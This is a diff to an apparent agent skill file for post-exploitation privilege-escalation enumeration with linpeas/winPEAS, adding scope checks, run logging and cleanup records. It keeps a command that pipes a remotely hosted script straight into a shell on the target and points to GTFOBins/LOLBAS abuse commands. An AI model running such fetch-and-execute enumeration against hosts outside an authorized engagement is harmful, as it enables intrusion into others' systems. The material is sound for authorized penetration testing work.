@@ -23,11 +23,11 @@ Surface likely local privilege-escalation vectors (SUID, caps, cron, creds, misc
 compromised host, capture the full output, and turn the highest-signal highlights into a verified path.
 
 ## Steps
-1. Set up the run dir per AGENTS.md (`$RUN`, `mkdir -p "$RUN/notes"`); scope inherited from `out/<engagement>/scope.txt`. Authorized post-ex on a host you already hold. **linpeas is noisy/slow** — fine in labs, think twice in sensitive environments.
-2. **Run on the target, capture everything** (host the script over HTTP from your box): `curl <lhost_url>/linpeas.sh | sh -s -- -a 2>&1 | tee /tmp/linpeas.txt` (Windows: `winPEASx64.exe > winpeas.txt`), then exfil into `$RUN/linpeas.txt`.
+1. Identify the foothold `TARGET`. `RUN="$(python3 -I scripts/otus-log.py init --engagement "$ENGAGEMENT" --skill linpeas --target "$TARGET")"`; `python3 -I scripts/otus-log.py scope-check --engagement "$ENGAGEMENT" --target "$TARGET" --run-dir "$RUN"`; nonzero STOP. linpeas is noisy/slow; record the one-shot transport.
+2. Wrap the recorded timeout-bounded transport with `python3 -I scripts/otus-log.py run --run-dir "$RUN" --target "$TARGET" -- <original transport argv>`. On-target command remains `curl <lhost_url>/linpeas.sh | sh -s -- -a 2>&1 | tee /tmp/linpeas.txt` (Windows: `winPEASx64.exe > winpeas.txt`). Use only reviewed script sources; capture output locally as `linpeas.txt` and record/remove created remote artifacts with positive cleanup proof.
 3. **Focus red/yellow highlights.** PEASS colour-codes the most promising findings — triage those first, not the whole dump.
 4. **Cross-check vectors.** Map each candidate (SUID, writable cron, sudo rule, capability, kernel) against **GTFOBins / LOLBAS** and known CVEs for a concrete abuse command; record each + its command in `notes/vectors.md`.
-5. **Exploit the most reliable path + marker + run record.** Verify before firing; pick the most reliable vector. Write a run marker (`- none identified` if nothing), then `run.json`.
+5. Hand verified vector candidates to privesc-root; any extra target check uses the helper. `python3 -I scripts/otus-log.py finish --run-dir "$RUN" --status "$STATUS" --summary "$SUMMARY" --item 'scope-confirmed=ok:../../scope.json' --item 'enum-captured=ok:linpeas.txt' --item 'vectors-analyzed=ok:notes/vectors.md' --item 'results-recorded=ok:findings.md'`; include actual artifact/cleanup fields and verified findings, or `none identified`.
 
 ## Modern tooling & alternatives
 PEASS-ng: `linpeas.sh` (Linux), `winPEASx64.exe` (Windows). Companions: `pspy` (watch cron/processes
@@ -37,9 +37,9 @@ without root), `linux-exploit-suggester` / `wesng` (kernel/OS → known exploits
 ```yaml
 checklist:
   - id: scope-confirmed
-    desc: Engagement scope confirmed once in out/<engagement>/scope.txt (inherited, not re-confirmed); authorized foothold host
+    desc: Explicit engagement authorization and foothold host checked
     verify: judge
-    evidence: ../../scope.txt
+    evidence: ../../scope.json
     on_fail: fail
     required: true
   - id: enum-captured
@@ -66,4 +66,4 @@ checklist:
 - **Noisy / slow** — fine in labs, think twice in sensitive environments; `scope-confirmed` fails hard (`on_fail: fail`).
 - **Don't blindly run suggested exploits** — verify each vector (version, writability, path) first; kernel exploits can crash the host.
 - Triage red/yellow highlights, not the whole dump — then map to a concrete GTFOBins/LOLBAS command. `pspy` catches root cron/processes a one-shot run can miss.
-- A run that finds no vector must still write `findings.md` + a `- none` line in `vectors.md`.
+- No vector still records `none` in notes/vectors.md and finishes with the matching summary.
